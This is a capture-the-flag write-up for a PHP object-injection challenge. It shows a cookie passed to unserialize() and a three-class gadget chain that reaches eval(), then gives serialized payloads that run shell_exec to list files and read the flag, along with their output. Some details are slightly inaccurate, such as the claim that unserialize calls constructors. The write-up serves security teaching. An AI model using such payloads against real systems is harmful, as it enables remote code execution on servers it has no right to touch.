# Un Secure

### Text: Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? It can cause Remote Code Execution. And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.

&nbsp;

Score: 100

&nbsp;

Included Files: [dist.zip](dist.zip)

---
 ## Writeup

In this challenge you are given a php server which you have to exploit to read out the contents of the flag. You are provided with a Dockerfile.

Dockerfile
```dockerfile
# copy all host file in cwd to container cwd
COPY . .

# move flag to root directory with random name
RUN mv flag.txt $(cat /dev/urandom | head -c 32 | hex).txt

```

When the server starts the flag is copied into the base directory under a random name. Since the server is only started once, this means that the name of the file will never change over the course of the challenge. The first step is to find the name of this file.
This can be done by exploiting some of the classes that come with challenge.

index.php
```php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);

    $t = unserialize($cookie);

}
```

In index.php a cookie provided by the user is directly input into the unserialize() function. This is a dangerous method which can be exploited if the user has uncontrolled access to the input. By inputting custom information, the user can create/modify any class or data. Luckly for us, the challenge provided three custom classes in which we can exploit.

class Vuln
```php
class Vuln
    {
        public $waf1;
        protected $waf2;
        private $waf3;
        public $cmd;
        function __toString()
        {
            if (!($this->waf1 === 1)) {
                die("not x");
            }
            if (!($this->waf2 === "\xde\xad\xbe\xef")) {
                die("not y");
            }
            if (!($this->waf3) === false) {
                die("not z");
            }

            eval($this->cmd);

        }
    }
```

Class Adders
```php
class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;

            var_dump($x);
        }
        function get_x()
        {
            return $this->x;
        }
    }
```

Class Echoers
```php
class Echoers
    {
        protected $klass;
        function __destruct()
        {
            echo $this->klass->get_x();
        }
    }
```

It can be seen in class Vuln that a command will be executed in the shell. All we have to do is create a Vuln object with a command to list out the current directory and find the flag file. The question is how can we create an instance of this class. We can use the unserialize function in index.php to unserialize a Vuln object. By setting the cookie to our serialized object, we can inject an object into the server.


Serialized Vuln object.
```php
O:16:"GadgetThree\Vuln":4:{s:4:"waf1";i:1;s:4:"waf2";s:4:"Þ­¾ï";s:4:"waf3";b:0;s:3:"cmd";s:26:"var_dump(shell_exec('ls'))";}
```

Using the serialized Vuln object above, we can create a Vuln object. Great. Except of course we have to call the __toString() method. Unfortunately we cannot call this directly via the unserialize() method. Now we have to utilize the other classes. Fortunately both of these classes contain magic methods which will automatically be called. For instance, the __construct() method on the Adder class will be called whenever the instance of the class is created, and the __destruct() method on the Echoers class will be called whenever an instance of this class is destroyed. By inputting a serialized class of Echoers, the __destruct() method will be called, executing the code inside. Since, object serializiation supports objects inside of objects, we can serialize an Echoers object with an Adder class as the $klass parameter. This means when the Echoer is destroyed, the Adder object will call the get_x() method. Now in the Adder class we must input a serialized Vuln() class as the $x parameter so that its __toString() method will be called. By correctly nesting the serialized classes we can finally get the Vuln() method to execute out command.

Full Nested Serialized Objects to list out directory contents
```php
O:17:"GadgetTwo\Echoers":1:{s:5:"klass";O:16:"GadgetOne\Adders":1:{s:1:"x";O:16:"GadgetThree\Vuln":4:{s:4:"waf1";i:1;s:4:"waf2";s:4:"Þ­¾ï";s:4:"waf3";b:0;s:3:"cmd";s:28:"var_dump(shell_exec('ls'));";}}}
```

By dumping the return of the shell command we will receive all of the files listed in the current directory including the name of the flag file. Now all we have to do is change the shell command to print out the contents of the flag.

Output of shell command to list out directory
```php
string(90) "182939124819238912571292389218129123.txt
composer.json
composer.lock
index.php
src
vendor
"
```

Full Nested Serialized Objects to print out flag file
```php
O:17:"GadgetTwo\Echoers":1:{s:5:"klass";O:16:"GadgetOne\Adders":1:{s:1:"x";O:16:"GadgetThree\Vuln":4:{s:4:"waf1";i:1;s:4:"waf2";s:4:"Þ­¾ï";s:4:"waf3";b:0;s:3:"cmd";s:69:"var_dump(shell_exec('cat 182939124819238912571292389218129123.txt'));";}}}
```

Output of shell command to read flag
```php
string(44) "TCP1P{unserialize in php go brrrrrrrr ouch}
```
"

## Flag: TCP1P{unserialize in php go brrrrrrrr ouch}